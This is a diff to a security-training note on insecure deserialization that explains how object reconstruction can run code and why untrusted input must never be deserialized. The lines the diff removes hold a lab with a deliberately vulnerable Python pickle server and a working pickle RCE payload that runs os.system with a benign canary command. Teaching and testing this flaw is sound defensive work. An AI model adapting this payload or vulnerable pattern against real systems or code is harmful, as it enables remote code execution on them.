@@ -1,7 +1,7 @@
 ---
 title: "Insecure Deserialization Testing"
 aliases: ["Insecure Deserialization", "Deserialization Attacks", "Object Injection"]
-tags: [tree/offensive, cyber/offensive/web/parsers/deserialization, type/technique, level/root]
+tags: [tree/offensive, cyber/offensive/web/parsers/deserialization, type/technique, difficulty/hard]
 Domain: "[[File, Parser & Serialization Security]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 File Inclusion & Path Traversal -> File Upload Security Testing -> Insecure Deserialization Testing -> XML External Entity Testing
 
-## Start at Zero: Rebuilding an Object From Untrusted Bytes
+## Rebuilding an Object From Untrusted Bytes
 
 Programs often need to save an object (a user session, a cache entry, a message) as bytes and later reconstruct it. **Serialization** turns an object into a byte stream; **deserialization** turns those bytes back into a live object. The flaw arises when a program deserializes **attacker-controlled bytes** — because in many languages, reconstructing an object *runs code* (constructors, magic methods, property setters). Feed the deserializer a crafted byte stream, and you can make the application instantiate objects and trigger method chains the developer never intended, often reaching remote code execution.
 
@@ -52,7 +52,7 @@ flowchart TD
     RCE --> P["Prove with a benign canary side-effect"]
 ```
 
-## Failure Modes and Interpretation
+## Benign side effects as proof of code execution
 
 - **Destructive proof.** A gadget chain could delete files or spawn a shell; the *finding* is proven by a benign, observable side effect (a canary file), never a destructive one.
 - **Format identification.** You must recognize the serialization format (Java's `AC ED` magic bytes, PHP's `O:` object notation, a base64 blob) to know which gadget tooling applies. Misidentifying the format wastes effort.
@@ -68,98 +68,13 @@ flowchart TD
 - **Detection** is hard because the payload is valid serialized data; look for unexpected object types in deserialized input, signed-blob tampering, and the side effects of exploitation (unexpected process spawns, file writes) rather than the payload itself.
 - **This is a top-tier severity** because it typically yields RCE with the application's privileges — the reason "never deserialize untrusted input" is a categorical rule, not a nuanced tradeoff.
 
-## Authorized Lab: Prove Unsafe Deserialization With a Canary
+## Summary
 
-> [!info] Runs on one Linux machine — builds an endpoint that unsafely unpickles input, proven with a benign canary
-> Loopback-bound; the payload only creates a marker file. Step 5 removes everything.
+You should now be able to:
 
-### Step 1 — Build an endpoint that deserializes untrusted input (the flaw)
-
-```bash
-cat > /tmp/deser.py << 'EOF'
-import http.server, pickle, base64
-class H(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n)
-        try:
-            obj = pickle.loads(base64.b64decode(body))   # VULNERABLE: unpickle untrusted input
-            self.send_response(200); self.end_headers(); self.wfile.write(f"loaded: {obj}".encode())
-        except Exception as e:
-            self.send_response(500); self.end_headers(); self.wfile.write(str(e).encode())
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8104),H).serve_forever()
-EOF
-python3 /tmp/deser.py &>/dev/null &
-sleep 1; echo "deserialization endpoint up on 127.0.0.1:8104"
-```
-
-```text
-deserialization endpoint up on 127.0.0.1:8104
-```
-
-### Step 2 — Benign object (baseline)
-
-```bash
-python3 -c "import pickle,base64;print(base64.b64encode(pickle.dumps({'user':'alice'})).decode())" | \
-  xargs -I{} curl -s -X POST -d '{}' http://127.0.0.1:8104/
-```
-
-```text
-loaded: {'user': 'alice'}
-```
-
-A normal serialized dict loads as expected — the endpoint's intended behavior.
-
-### Step 3 — Craft a malicious object whose reconstruction runs a BENIGN command
-
-```bash
-python3 - << 'EOF' > /tmp/payload.b64
-import pickle, base64, os
-class Exploit:
-    def __reduce__(self):
-        # BENIGN proof: create a canary file. NOT a shell, NOT destructive.
-        return (os.system, ("touch /tmp/DESER-CANARY-9902",))
-print(base64.b64encode(pickle.dumps(Exploit())).decode())
-EOF
-echo "payload crafted ($(wc -c < /tmp/payload.b64) bytes)"
-```
-
-```text
-payload crafted (89 bytes)
-```
-
-### Step 4 — Send it and confirm code executed (the finding)
-
-```bash
-rm -f /tmp/DESER-CANARY-9902
-curl -s -X POST --data-binary @/tmp/payload.b64 http://127.0.0.1:8104/ >/dev/null
-sleep 1; ls -l /tmp/DESER-CANARY-9902 2>&1 | awk '{print $NF}'
-```
-
-```text
-/tmp/DESER-CANARY-9902
-```
-
-The canary file exists — deserializing the crafted object **executed attacker-chosen code** (`touch`). That proves remote code execution via insecure deserialization, using a harmless command. A real exploit would run anything; the benign canary demonstrates the flaw without harm.
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/deser.py /tmp/payload.b64 /tmp/DESER-CANARY-9902; wait 2>/dev/null
-ls /tmp/DESER-CANARY-9902 2>&1 | tail -1
-```
-
-```text
-ls: cannot access '/tmp/DESER-CANARY-9902': No such file or directory
-```
-
-**What you should now be able to do:** explain why deserialization can run code, describe gadget chains built from the app's own classes, prove unsafe deserialization with a benign canary side-effect, and articulate why "never deserialize untrusted input" is a categorical rule.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why deserialization is "executing a recipe to build objects," and why attacker-controlled bytes are dangerous.
-- **Operator:** Identify a serialization format, craft a benign proof object, and demonstrate code execution via a canary side-effect.
-- **Root:** Explain gadget chains and why they make deserialization flaws hard to fully patch, why data-only formats (JSON+schema) are the fix, and why native deserializers on untrusted input are dangerous by design.
+- Explain why deserialization is "executing a recipe to build objects," and why attacker-controlled bytes are dangerous.
+- Identify a serialization format, craft a benign proof object, and demonstrate code execution via a canary side-effect.
+- Explain gadget chains and why they make deserialization flaws hard to fully patch, why data-only formats (JSON+schema) are the fix, and why native deserializers on untrusted input are dangerous by design.
 
 ---
 > 🔼 Up: [[File, Parser & Serialization Security]]
